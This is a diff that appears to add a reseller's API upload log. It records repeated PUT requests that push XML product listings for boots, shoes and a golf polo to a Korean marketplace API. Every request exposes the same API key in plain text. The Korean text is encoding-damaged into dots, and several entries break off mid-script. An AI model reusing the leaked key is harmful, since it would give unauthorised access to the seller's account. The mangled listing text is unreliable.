<br>Triple-reinforced toe area and quadruple reinforced heel area for lasting quality<br>Diamond textured toe and heel reinforcements resist scuffs and scratches<br>Oil-resistant and shock-absorbent blown rubber outsole is durable yet still flexibleADDITIONAL DETAILS:<br>Manufacturer..s warranty: 1-year from date of purchase against manufacturer..s defect Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Muck Boots<br>Country of Origin: Imported<br>Style: CHH <br>Web ID: 15MBOMMNCHRHBLCKXFBO function openWarningPopup() {var skuId = document.getElementById('p?}??
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2010789524 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 13477
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[1020747]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[Muck Boots  Mens Chore High Waterproof Work Boots/950006959 .... ..../....]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Muck Boots]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950006959]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006959/600_600_15MBOMMNCHRHBLCKXFBO_Black_AGR.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006959/600_600_15MBOMMNCHRHBLCKXFBO_Black_AGR.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006959/600_600_15MBOMMNCHRHBLCKXFBO_Black_AGR.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006959/600_600_15MBOMMNCHRHBLCKXFBO_Black_AGR.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Muck Boots Mens Chore High Waterproof Work Boots</div><div style="text-align:left;">PROD950006959</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>No job is too tough for Muck Boots&reg; Men..s Chore High boots. Built with reliable waterproof protection, exceptional durability and no-slip grip, these do-anything rubber boots empower you to tackle any job.WEATHER-READY PERFORMANCE:100 waterproof construction<br>Comfort range: 85&deg;F to sub-freezing conditionsDESIGN:<br>Stretch-fit topline binding hugs accommodates most calf girths<br>5mm CR flex-foam bootie with four-way stretch nylon offers freedom of movement<br>Airmesh&trade; lining stays breathable and comfortable<br>Achilles reinforcement for additional protection and stability<br>Kick rim on heels for easy removal<br>Wide cut heel base for excellent stabilityDURABLE WEAR:<br>Seamless, quick-clean rubber overlay for easy maintenance <br>Triple-reinforced toe area and quadruple reinforced heel area for lasting quality<br>Diamond textured toe and heel reinforcements resist scuffs and scratches<br>Oil-resistant and shock-absorbent blown rubber outsole is durable yet still flexibleADDITIONAL DETAILS:<br>Manufacturer..s warranty: 1-year from date of purchase against manufacturer..s defect Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Muck Boots<br>Country of Origin: Imported<br>Style: CHH <br>Web ID: 15MBOMMNCHRHBLCKXFBO function openWarningPopup() {var skuId = document.getElementById('
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2010816425 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 10609
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[957942]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[........ Adidas  Mens climachillreg; Print Block Golf Polo/950003786 .... .... .... ....../........]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Adidas]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950003786]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Adidas/950003786/600_600_GolfGalaxy_16ADIMCCPRNTBLCKPAPT_Mineral_Blue1.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Adidas/950003786/600_600_GolfGalaxy_16ADIMCCPRNTBLCKPAPT_Mineral_Blue1.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Adidas/950003786/600_600_GolfGalaxy_16ADIMCCPRNTBLCKPAPT_Mineral_Blue1.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Adidas/950003786/600_600_GolfGalaxy_16ADIMCCPRNTBLCKPAPT_Mineral_Blue1.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQ5ODcxNjI0OXMtdG9w.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">adidas Mens climachill&reg; Print Block Golf Polo</div><div style="text-align:left;">PROD950003786</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Bomb it down the fairway in the adidas&reg; Men..s climachill&reg; Print Block Golf Polo. This two-tone shirt is made from 100% polyester and uses climachill&reg; technology for maximum cooling through 360.. ventilation. Featuring an accented woven collar with hidden buttons for those windy days on the course, the climachill&reg; Print Block is ready for your next tee time.<br><br>FEATURES:<br><br><br>Woven collar w/ hidden buttons<br>climachill&reg; fabric provides maximum cooling through 360.. ventilation<br>Cooling comfort even in the hottest conditions<br>No side seams for enhanced comfort<br>Silver adidas&reg; performance logo on left sleeve Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: adidas<br>Country of Origin: Imported<br>Fabric Content: 100% Polyester <br>Web ID: 16ADIMCCPRNTBLCKPAPT function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=''''){ var descriptiveattrJson=JSON.parse(dojo.byId(''skuDescriptivattribute'').innerHTML); var descriptiveattrDetails=descriptiveattrJson.descriptive; for(var i=0;i<br><br>.......... : 2018.11.28 16:04:18</div><div style="text-align:center;"><div style=""><div class="divColorImgBox" style="border:1px solid #888888;margin-topA~??
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2010816425 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 10609
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[957942]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[........ Adidas  Mens climachillreg; Print Block Golf Polo/950003786 .... .... .... ....../........]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Adidas]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950003786]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Adidas/950003786/600_600_GolfGalaxy_16ADIMCCPRNTBLCKPAPT_Mineral_Blue1.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Adidas/950003786/600_600_GolfGalaxy_16ADIMCCPRNTBLCKPAPT_Mineral_Blue1.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Adidas/950003786/600_600_GolfGalaxy_16ADIMCCPRNTBLCKPAPT_Mineral_Blue1.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Adidas/950003786/600_600_GolfGalaxy_16ADIMCCPRNTBLCKPAPT_Mineral_Blue1.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQ5ODcxNjI0OXMtdG9w.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">adidas Mens climachill&reg; Print Block Golf Polo</div><div style="text-align:left;">PROD950003786</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Bomb it down the fairway in the adidas&reg; Men..s climachill&reg; Print Block Golf Polo. This two-tone shirt is made from 100% polyester and uses climachill&reg; technology for maximum cooling through 360.. ventilation. Featuring an accented woven collar with hidden buttons for those windy days on the course, the climachill&reg; Print Block is ready for your next tee time.<br><br>FEATURES:<br><br><br>Woven collar w/ hidden buttons<br>climachill&reg; fabric provides maximum cooling through 360.. ventilation<br>Cooling comfort even in the hottest conditions<br>No side seams for enhanced comfort<br>Silver adidas&reg; performance logo on left sleeve Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: adidas<br>Country of Origin: Imported<br>Fabric Content: 100% Polyester <br>Web ID: 16ADIMCCPRNTBLCKPAPT function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=''''){ var descriptiveattrJson=JSON.parse(dojo.byId(''skuDescriptivattribute'').innerHTML); var descriptiveattrDetails=descriptiveattrJson.descriptive; for(var i=0;i<br><br>.......... : 2018.11.28 16:04:18</div><div style="text-align:center;"><div style=""><div class="divColorImgBox" style="border:1px solid #888888;margin-to
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2211179171 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 20839
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[1020687]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[...... Nike  Mens Kaishi 2.0 Shoes/950002322 .... ........ ...... ..../...... .... ........]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Nike]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950002322]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Nike/950002322/600_600_16NIKMKSH20BLKWHTLFS_Navy_White.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Nike/950002322/600_600_16NIKMKSH20BLKWHTLFS_Navy_White.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Nike/950002322/600_600_16NIKMKSH20BLKWHTLFS_Navy_White.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Nike/950002322/600_600_16NIKMKSH20BLKWHTLFS_Navy_White.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Nike Mens Kaishi 2.0 Shoes</div><div style="text-align:left;">PROD950002322</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Updated to bring you even more comfort, the Nike&reg; Men..s Kaishi 2.0 casual shoe remains ultra lightweight and stylish. The flexible upper features mesh materials for seamless comfort, providing a sock-like fit without sacrificing support. With an all-new siped outsole, the Kaishi 2.0 weighs less than its predecessor and makes you feel like you..re walking on air. Welded TPU overlays add durable support and structure, ideal for all-day wear. <br><br>FEATURES:<br><br><br>Casual shoe inspired by the design of the Nike&reg; Roshe One <br>Low-cut design for increased mobility and flexibility <br>Mesh upper is seamless and increases overall comfort <br>Welded TPU overlays add structure and support <br>No-sew Nike&reg; Swoosh design fused in.to the lateral side <br>Mesh bootie construction wraps the foot for improved support <br>Foam midsole doubles as an outsole for decreased weight <br>Siped outsole reduces the shoe..s overall weight <br>Waffle lug design to improve traction and gripProposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Nike<br>Country of Origin: Imported<br>Style: 833411 <br>Web ID: 16NIKMKSH20BLKWHTLFS function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=''''){ var descriptiveattrJson=JSON.parse(dojo.byId(''skuDescriptivattribute'').innerHTML); varpA~??
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2211179171 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 20839
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[1020687]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[...... Nike  Mens Kaishi 2.0 Shoes/950002322 .... ........ ...... ..../...... .... ........]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Nike]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950002322]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Nike/950002322/600_600_16NIKMKSH20BLKWHTLFS_Navy_White.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Nike/950002322/600_600_16NIKMKSH20BLKWHTLFS_Navy_White.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Nike/950002322/600_600_16NIKMKSH20BLKWHTLFS_Navy_White.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Nike/950002322/600_600_16NIKMKSH20BLKWHTLFS_Navy_White.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Nike Mens Kaishi 2.0 Shoes</div><div style="text-align:left;">PROD950002322</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Updated to bring you even more comfort, the Nike&reg; Men..s Kaishi 2.0 casual shoe remains ultra lightweight and stylish. The flexible upper features mesh materials for seamless comfort, providing a sock-like fit without sacrificing support. With an all-new siped outsole, the Kaishi 2.0 weighs less than its predecessor and makes you feel like you..re walking on air. Welded TPU overlays add durable support and structure, ideal for all-day wear. <br><br>FEATURES:<br><br><br>Casual shoe inspired by the design of the Nike&reg; Roshe One <br>Low-cut design for increased mobility and flexibility <br>Mesh upper is seamless and increases overall comfort <br>Welded TPU overlays add structure and support <br>No-sew Nike&reg; Swoosh design fused in.to the lateral side <br>Mesh bootie construction wraps the foot for improved support <br>Foam midsole doubles as an outsole for decreased weight <br>Siped outsole reduces the shoe..s overall weight <br>Waffle lug design to improve traction and gripProposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Nike<br>Country of Origin: Imported<br>Style: 833411 <br>Web ID: 16NIKMKSH20BLKWHTLFS function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=''''){ var descriptiveattrJson=JSON.parse(dojo.byId(''skuDescriptivattribute'').innerHTML); var
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2010852067 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 11164
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[1020749]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[.... Merrell  Mens Chameleon Shift Ventilator Waterproof Hiking Boots/950002980 .... ....../....../]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Merrell]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950002980]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Merrell/950002980/600_600_15MRRMCHMSHFTVNTWFBO_Castle_Rock_Tahoe_Blue1.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Merrell/950002980/600_600_15MRRMCHMSHFTVNTWFBO_Castle_Rock_Tahoe_Blue1.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Merrell/950002980/600_600_15MRRMCHMSHFTVNTWFBO_Castle_Rock_Tahoe_Blue1.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Merrell/950002980/600_600_15MRRMCHMSHFTVNTWFBO_Castle_Rock_Tahoe_Blue1.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Merrell Mens Chameleon Shift Ventilator Waterproof Hiking Boots</div><div style="text-align:left;">PROD950002980</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Athletic in every way, this ultra-lightweight hiking shoe reacts with ease and agility to the rugged outdoors. With a waterproof upper and bellows tongue, this hiker delivers on maintaining dry, clean feet. An MBound TRK&trade; midsole and cushioned heel ensure your trek is as comfortable as they come. Vibram&trade; outsoles with 5mm lug depths make the toughest terrain melt under your feet. Conquer the trail in the Chameleon Shift Ventilators.FEATURES:<br>Nubuck leather and mesh upper with traditional lace closure<br>Bellows tongue keeps debris out <br>Ace single density removable footbed for easy cleaning or to make room for insoles<br>Merrell In-Board&trade; Compression Molded EVA footframe provides cushioning <br>MBound TRK&trade; midsole protects feet and reacts to uneven terrain<br>Molded nylon arch shank for support<br>HeeL .AIR cushion absorbs shock and adds stability<br>Vibram&trade; rubber outsole with 5 mm lug for stability, durability and traction Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Merrell<br>Country of Origin: Imported <br>Web ID: 15MRRMCHMSHFNTWFBO function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=''''){ var descriptivepA~??
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2010852067 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 11164
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[1020749]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[.... Merrell  Mens Chameleon Shift Ventilator Waterproof Hiking Boots/950002980 .... ....../....../]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Merrell]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950002980]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Merrell/950002980/600_600_15MRRMCHMSHFTVNTWFBO_Castle_Rock_Tahoe_Blue1.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Merrell/950002980/600_600_15MRRMCHMSHFTVNTWFBO_Castle_Rock_Tahoe_Blue1.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Merrell/950002980/600_600_15MRRMCHMSHFTVNTWFBO_Castle_Rock_Tahoe_Blue1.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Merrell/950002980/600_600_15MRRMCHMSHFTVNTWFBO_Castle_Rock_Tahoe_Blue1.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Merrell Mens Chameleon Shift Ventilator Waterproof Hiking Boots</div><div style="text-align:left;">PROD950002980</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Athletic in every way, this ultra-lightweight hiking shoe reacts with ease and agility to the rugged outdoors. With a waterproof upper and bellows tongue, this hiker delivers on maintaining dry, clean feet. An MBound TRK&trade; midsole and cushioned heel ensure your trek is as comfortable as they come. Vibram&trade; outsoles with 5mm lug depths make the toughest terrain melt under your feet. Conquer the trail in the Chameleon Shift Ventilators.FEATURES:<br>Nubuck leather and mesh upper with traditional lace closure<br>Bellows tongue keeps debris out <br>Ace single density removable footbed for easy cleaning or to make room for insoles<br>Merrell In-Board&trade; Compression Molded EVA footframe provides cushioning <br>MBound TRK&trade; midsole protects feet and reacts to uneven terrain<br>Molded nylon arch shank for support<br>HeeL .AIR cushion absorbs shock and adds stability<br>Vibram&trade; rubber outsole with 5 mm lug for stability, durability and traction Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Merrell<br>Country of Origin: Imported <br>Web ID: 15MRRMCHMSHFNTWFBO function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=''''){ var descriptive
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
